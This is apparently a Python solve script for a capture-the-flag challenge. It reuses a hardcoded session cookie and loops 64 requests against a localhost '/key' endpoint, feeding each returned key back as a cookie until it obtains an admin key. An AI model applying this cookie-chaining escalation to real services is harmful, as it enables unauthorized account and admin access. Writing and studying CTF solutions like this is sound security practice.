import requests 

# this value comes from your browser cookies after logging in (so CHANGE IT ACCORDINGLY)
# (didn't have the willpower to implement whole ahh login in the solve script)
connect_sid_value = "s:EWe5unWugcirOo8qXDd7styEu4jEqr6p.vScRUclZVwJK//yeQNkZTdyT17x7BYfnxmuoatww358"

cookies = {
    'connect.sid': connect_sid_value, 
    'key': 'WsVJgmbpbIVwyx6Uutp/foE6akppkAqTijdVlAwdWlsQl3auPr1QkYOmMteFhLy5'
}

key = ''
for i in range(64):
    r = requests.get('http://localhost:5000/key', cookies=cookies)
    key = r.text[1:]
    cookies['key'] = key
    print(f"{i+1}/64: {key}")

print('\nFound admin key bwehehehe')
print(key)
